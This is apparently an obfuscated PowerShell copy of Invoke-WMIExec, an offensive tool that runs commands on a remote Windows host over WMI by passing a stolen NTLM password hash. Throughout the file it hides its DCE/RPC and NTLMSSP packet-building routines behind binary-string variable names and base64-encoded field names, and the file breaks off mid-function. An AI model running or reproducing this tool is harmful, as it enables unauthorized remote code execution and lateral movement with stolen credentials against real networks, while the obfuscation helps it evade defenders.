function Invoke-WMIExec
{
[CmdletBinding()]
param
(
    [parameter(Mandatory=$true)][String]$Target,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$false)][String]$Command,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Int]$Sleep=10
)
if($Command)
{
    ${00011000000111101} = $true
}
function _00011111101010011
{
    param(${_10100001001110101})
    ForEach(${01010111001000010} in ${_10100001001110101}.Values)
    {
        ${00100100111001100} += ${01010111001000010}
    }
    return ${00100100111001100}
}
function _00111000011010000
{
    param([Int]${_00010011110100001},[Byte[]]${_01111001101101100},[Byte[]]${_01101000110100110},[Byte[]]${_10101101111011111},[Byte[]]${_10011011110101111},[Byte[]]${_00100001010001010})
    [Byte[]]${00100011010011011} = [System.BitConverter]::GetBytes(${_00010011110100001})
    ${00110011101110001} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x0b))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x48,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${00100011010011011})
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xb8,0x10))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBzAHMAbwBjAEcAcgBvAHUAcAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AQwB0AHgASQB0AGUAbQBzAA=='))),${_01101000110100110})
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10101101111011111})
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwA='))),[Byte[]](0x01))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUA'))),${_10011011110101111})
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIA'))),${_00100001010001010})
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByAA=='))),[Byte[]](0x00,0x00))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AA=='))),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    if(${_01101000110100110}[0] -eq 2)
    {
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),[Byte[]](0xc4,0xfe,0xfc,0x99,0x60,0x52,0x1b,0x10,0xbb,0xcb,0x00,0xaa,0x00,0x21,0x34,0x7a))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
    }
    elseif(${_01101000110100110}[0] -eq 3)
    {
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMgA='))),[Byte[]](0x01,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAyAA=='))),[Byte[]](0x01))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAzAA=='))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMgA='))),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMgA='))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADIA'))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADIA'))),[Byte[]](0x33,0x05,0x71,0x71,0xba,0xbe,0x37,0x49,0x83,0x19,0xb5,0xdb,0xef,0x9c,0xcc,0x36))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADIA'))),[Byte[]](0x01,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x02,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwAzAA=='))),[Byte[]](0x01))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA0AA=='))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAMwA='))),[Byte[]](0x43,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xc0,0x00,0x00,0x00,0x00,0x00,0x00,0x46))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIAMwA='))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByADMA'))),[Byte[]](0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4ADMA'))),[Byte[]](0x2c,0x1c,0xb7,0x6c,0x12,0x98,0x40,0x45,0x03,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByADMA'))),[Byte[]](0x01,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x04))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQANAA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x97,0x82,0x08,0xe2))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4A'))),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }
    if(${_00010011110100001} -eq 3)
    {
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x02))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQAMwA='))),[Byte[]](0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAZgBpAGUAcgA='))),[Byte[]](0x4e,0x54,0x4c,0x4d,0x53,0x53,0x50,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAHMAcwBhAGcAZQBUAHkAcABlAA=='))),[Byte[]](0x01,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAGcAbwB0AGkAYQB0AGUARgBsAGEAZwBzAA=='))),[Byte[]](0x97,0x82,0x08,0xe2))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ARABvAG0AYQBpAG4A'))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwBXAG8AcgBrAHMAdABhAHQAaQBvAG4ATgBhAG0AZQA='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        ${00110011101110001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBTAFYAZQByAHMAaQBvAG4A'))),[Byte[]](0x06,0x01,0xb1,0x1d,0x00,0x00,0x00,0x0f))
    }
    return ${00110011101110001}
}
function _01111010001111011
{
    param([Byte[]]${_00100010111110110})
    [Byte[]]${01100000011011100} = [System.BitConverter]::GetBytes(${_00100010111110110}.Length)[0,1]
    [Byte[]]${01110010111100001} = [System.BitConverter]::GetBytes(${_00100010111110110}.Length + 28)[0,1]
    ${10110011100110100} = New-Object System.Collections.Specialized.OrderedDictionary
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x10))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${01110010111100001})
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),${01100000011011100})
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),[Byte[]](0x03,0x00,0x00,0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xd0,0x16))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xd0,0x16))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),[Byte[]](0x02))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),[Byte[]](0x00,0x00,0x00,0x00))
    ${10110011100110100}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUAA='))),${_00100010111110110})
    return ${10110011100110100}
}
function _00001110101011110
{
    param([Byte[]]${_00111001110100010},[Int]${_10011011011110111},[Int]${_00000000001111001},[Int]${_01000101111000111},[Byte[]]${_00010011110100001},[Byte[]]${_10101101111011111},[Byte[]]${_01001001100000111},[Byte[]]${_10010101101010011})
    if(${_00000000001111001} -gt 0)
    {
        ${10110111101010101} = ${_00000000001111001} + ${_01000101111000111} + 8
    }
    [Byte[]]${00000111111001000} = [System.BitConverter]::GetBytes(${_10011011011110111} + 24 + ${10110111101010101} + ${_10010101101010011}.Length)
    [Byte[]]${10010000110010000} = ${00000111111001000}[0,1]
    [Byte[]]${00111000011001011} = [System.BitConverter]::GetBytes(${_10011011011110111} + ${_10010101101010011}.Length)
    [Byte[]]${_00000000001111001} = [System.BitConverter]::GetBytes(${_00000000001111001})[0,1]
    ${01111010010101000} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x00))
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),${_00111001110100010})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),${10010000110010000})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),${_00000000001111001})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${_00010011110100001})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwBjAEgAaQBuAHQA'))),${00111000011001011})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10101101111011111})
    ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAG4AdQBtAA=='))),${_01001001100000111})
    if(${_10010101101010011}.Length)
    {
        ${01111010010101000}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQA='))),${_10010101101010011})
    }
    return ${01111010010101000}
}
function _01111011001110011
{
    param([Byte[]]${_01100101000110110},[Byte[]]${_00010011110100001},[Byte[]]${_10101101111011111},[Byte[]]${_00010011010110111})
    ${01111111010001111} = New-Object System.Collections.Specialized.OrderedDictionary
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgA='))),[Byte[]](0x05))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQAVAB5AHAAZQA='))),[Byte[]](0x0e))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAGMAawBlAHQARgBsAGEAZwBzAA=='))),[Byte[]](0x03))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABhAHQAYQBSAGUAcAByAGUAcwBlAG4AdABhAHQAaQBvAG4A'))),[Byte[]](0x10,0x00,0x00,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgByAGEAZwBMAGUAbgBnAHQAaAA='))),[Byte[]](0x48,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAbgBnAHQAaAA='))),[Byte[]](0x00,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABJAEQA'))),${_00010011110100001})
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAWABtAGkAdABGAHIAYQBnAA=='))),[Byte[]](0xd0,0x16))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAHgAUgBlAGMAdgBGAHIAYQBnAA=='))),[Byte[]](0xd0,0x16))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBzAHMAbwBjAEcAcgBvAHUAcAA='))),${_01100101000110110})
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AQwB0AHgASQB0AGUAbQBzAA=='))),[Byte[]](0x01))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgA='))),[Byte[]](0x00,0x00,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG4AdABlAHgAdABJAEQA'))),${_10101101111011111})
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgB1AG0AVAByAGEAbgBzAEkAdABlAG0AcwA='))),[Byte[]](0x01))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAyAA=='))),[Byte[]](0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUA'))),${_00010011010110111})
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIA'))),[Byte[]](0x00,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBuAHQAZQByAGYAYQBjAGUAVgBlAHIATQBpAG4AbwByAA=='))),[Byte[]](0x00,0x00))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AA=='))),[Byte[]](0x04,0x5d,0x88,0x8a,0xeb,0x1c,0xc9,0x11,0x9f,0xe8,0x08,0x00,0x2b,0x10,0x48,0x60))
    ${01111111010001111}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAGEAbgBzAGYAZQByAFMAeQBuAHQAYQB4AFYAZQByAA=='))),[Byte[]](0x02,0x00,0x00,0x00))
    return ${01111111010001111}
}
function _01000011010001100
{
    param([Int]${_01000101111000111},[Byte[]]${_10100001111000011},[Byte[]]${_10101000101100111})
    ${00100110111001001} = New-Object System.Collections.Specialized.OrderedDictionary
    if(${_01000101111000111} -eq 4)
    {
        ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABkAGkAbgBnAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
        [Byte[]]${00010101011010001} = 0x04
    }
    elseif(${_01000101111000111} -eq 8)
    {
        ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABkAGkAbgBnAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]${00010101011010001} = 0x08
    }
    elseif(${_01000101111000111} -eq 12)
    {
        ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABkAGkAbgBnAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        [Byte[]]${00010101011010001} = 0x0c
    }
    else
    {
        [Byte[]]${00010101011010001} = 0x00
    }
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABUAHkAcABlAA=='))),[Byte[]](0x0a))
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABMAGUAdgBlAGwA'))),${_10100001111000011})
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABQAGEAZABMAGUAbgA='))),${00010101011010001})
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABSAGUAcwBlAHIAdgBlAGQA'))),[Byte[]](0x00))
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQB1AHQAaABDAG8AbgB0AGUAeAB0AEkARAA='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABWAGUAcgBpAGYAaQBlAHIAVgBlAHIAcwBpAG8AbgBOAHUAbQBiAGUAcgA='))),[Byte[]](0x01,0x00,0x00,0x00))
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABWAGUAcgBpAGYAaQBlAHIAQwBoAGUAYwBrAHMAdQBtAA=='))),[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    ${00100110111001001}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBUAEwATQBTAFMAUABWAGUAcgBpAGYAaQBlAHIAUwBlAHEAdQBlAG4AYwBlAE4AdQBtAGIAZQByAA=='))),${_10101000101100111})
    return ${00100110111001001}
}
function _01001110110010100
{
    param([Byte[]]${_01001001000010111},[Byte[]]${_10111000001001000},[Byte[]]${_10110001101110001})
    ${00000001010010011} = New-Object System.Collections.Specialized.OrderedDictionary
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGEAagBvAHIA'))),[Byte[]](0x05,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBlAHIAcwBpAG8AbgBNAGkAbgBvAHIA'))),[Byte[]](0x07,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAZQByAHYAZQBkAA=='))),[Byte[]](0x00,0x00,0x00,0x00))
    ${00000001010010011}.Add($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAHUAcwBhAGwAaQB0AHkASQBEAA=='))),${_01001001000010111})
